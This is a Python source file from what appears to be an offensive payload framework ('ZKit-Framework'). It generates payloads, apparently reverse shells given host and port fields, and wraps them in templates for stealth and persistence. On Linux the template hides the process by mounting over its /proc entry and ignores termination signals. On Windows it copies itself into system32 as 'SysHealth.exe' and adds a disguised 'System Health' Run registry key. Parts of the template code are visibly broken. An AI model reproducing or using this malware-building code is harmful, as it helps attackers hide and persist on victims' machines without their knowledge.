import random
import sys
from importlib import import_module as imp
from os import path

import core.lib._errors as _errors
from core import __version__ as version
from core.helper_core.coloring import Color
from core.lib.interacting import Interact
from core.lib.randoms import random_str

PayloadConfigError = _errors.PayloadConfigError
BASIC_LEVEL = "basic"
APACHE_LICENSE = "Apache Software License 2.0"
REQUIRED_VARS = ("name", "version", "author", "description", "payloads")
OPTIONAL_VARS = {"license": APACHE_LICENSE, "required_version": version,
                 "homepage": "", "profile": "", "level": BASIC_LEVEL, 'fields': ["host", "port"], 'fulldescription': ""
                 }
CONFIG_FILE = "zkit.yml"
CONFIG_FILE_EX = "zkit.yaml"


class PayloadGenerator(Interact, required_vars=REQUIRED_VARS, optional_vars=OPTIONAL_VARS):
    def __init__(self, root: str):
        self._LINUX_HIDER = """
import signal as s
from random import choice as c
def {hide_process}():\n\tch = s.uppercase + s.digits
\ttoken = "".join(c(ch) for i in range(32))
\tif not os.path.isdir("/tmp/%s" % (token)) :\n\tif os.popen("sudo whoami").read() == "root":
\tos.system("sudo mkdir /tmp/%s && sudo mount -o bind /tmp/%s /proc/%s" % (os.getpid(), token, os.getpid()))
\tsignal.signal(signal.SIGTERM, signal.SIG_IGN)\n\tsignal.signal(signal.SIGINT, signal.SIG_IGN)
{hide_process}()
        """
        self._WINDOWS_HIDER = """
from winreg import OpenKey , SetValueEx
def {keepyourselfalive}() :\n\tf = open(str(__file__) , "rb")
\n\tff = open("C:\\Windows\\system32\\SysHealth.exe" , "wb") 
\tff.write(f.read())\n\tf.close()\n\t\n\tff.close()
\tos.system("C:\\Windows\\system32\\SysHealth.exe")
\tSetValueEx("HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
             "System Health",0,"REG_SZ", "C:\\Windows\\system32\\SysHealth.exe")
{keepyourselfalive}()
        """
        self._IMPORTS = "import socket,os,sys\n"
        self.root = root
        self.root.replace("/", "\\")
        if not self.root.endswith(('\\', "/")):
            self.root += "\\"
        self.CONFIG_FILE = path.abspath(self.root + CONFIG_FILE)
        self.CONFIG_FILE_EX = path.abspath(self.root + CONFIG_FILE_EX)
        self.info = self.load_info(self.CONFIG_FILE)
        self.info = self.validate_vars(self.info)
        self.payloads = {}
        for payload in self.info['payloads']:
            self.payloads[payload] = imp(
                "." + payload, self.root.replace(sys.path[0], '').replace('\\', '.')[1:-1])

    def get_random_strs(self, size=4, count=7):
        return [random_str(size) for _ in range(count)]

    def get_fields(self):
        return self.info['fields']

    def handle_version(self):
        if self.info['version'] > version:
            raise PayloadConfigError(f"This payload requires {self.info['version']} or upper but "
                                     f"your zkit-framework version is {version}"
                                     "Please consider upgrading your ZKit-Framework using updater.py")

    def _handle_levels(self, payload: str, level: str, platform: str, strs):
        if level.lower() == "basic":
            # User wants zkit to handle hiding
            if platform.lower() == "windows":
                hider = self._WINDOWS_HIDER.format(keepyourselfalive=strs[0])
            elif platform.lower() == "linux":
                hider = self._LINUX_HIDER.format(hide_process=strs[0])
            else:
                print("The payload platform is not supported and level is basic ."
                      "if your payloads are for windows linux name them windows.py , linux.py"
                      "if you payloads platforms are not linux or windows please change level to "
                      "advanced"
                      "If the payload is not yours . please report it to developer of it zkit will"
                      "ignore it")
                hider = ""
            return self._IMPORTS + random.choice(["", "\n", "\n\n"]) +\
                hider + payload + random.choice(["", "\n", "\n\n"])

    def interact(self, data):
        "Generates the payload"
        info = self.info
        print("\n{} By {}\nDescription : {}\nplease write '-1' for more info".format(
            self.info['name'], info['author'], info['description']))
        if str(input("Or press enter : ")) == "-1":
            [print(Color().RandomColor() + f"{key} : {info[key]}"
                   + Color().GetColor('reset'), end="\n\n") for key in info]

        if len(self.payloads) >= 2:
            print("This Payload-Pack has {} diffrent payloads in it (usually for diffrent platform) ."
                  "They are : \n".format(len(self.payloads)))
            for index, key in enumerate(self.payloads):
                print(Color().RandomColor() +
                      "{%s}--> %s\n" % (str(index + 1), key) + Color().GetColor('reset'))
            choice = str(input("Which Payload (Index of it) : "))
            payloads_list = list(self.payloads.keys())
            choice = payloads_list[int(choice) - 1]
        else:
            choice = list(self.payloads.keys())[0]

        strs = self.get_random_strs()
        payload = self.payloads[choice].Payload(*data, strs[1:]).create()
        payload = self._handle_levels(payload, info['level'], choice, strs)

        # sweet now payload is generated . lets return the result
        return payload
